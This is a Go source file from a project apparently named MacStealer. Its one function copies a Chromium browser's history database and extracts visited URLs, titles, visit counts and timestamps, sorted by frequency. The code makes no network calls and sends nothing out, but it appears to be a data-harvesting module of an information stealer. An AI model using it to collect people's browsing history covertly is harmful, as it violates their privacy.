package browsingdata

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"sort"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/ultra-supara/MacStealer/util"
)

type ChromiumHistory []History

type History struct {
	URL           string    `json:"url"`
	Title         string    `json:"title"`
	VisitCount    int       `json:"visit_count"`
	LastVisitTime time.Time `json:"last_visit_time"`
}

const (
	queryChromiumHistory = `SELECT url, title, visit_count, last_visit_time FROM urls`
)

func GetHistory(path string) ([]History, error) {
	// Copy history db to current directory to avoid lock issues
	hFile := "./history_temp"
	err := util.FileCopy(path, hFile)
	if err != nil {
		return nil, fmt.Errorf("DB FileCopy failed: %w", err)
	}
	defer os.Remove(hFile)

	historyDB, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?mode=ro", hFile))
	if err != nil {
		return nil, fmt.Errorf("failed to open history database: %w", err)
	}
	defer historyDB.Close()

	rows, err := historyDB.Query(queryChromiumHistory)
	if err != nil {
		return nil, fmt.Errorf("failed to query history: %w", err)
	}
	defer rows.Close()

	var histories []History
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)

		if err = rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
			log.Println(err)
			continue
		}

		history := History{
			URL:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: util.TimeEpoch(lastVisitTime),
		}
		histories = append(histories, history)
	}

	// Sort by visit count (descending)
	sort.Slice(histories, func(i, j int) bool {
		return histories[i].VisitCount > histories[j].VisitCount
	})

	return histories, nil
}
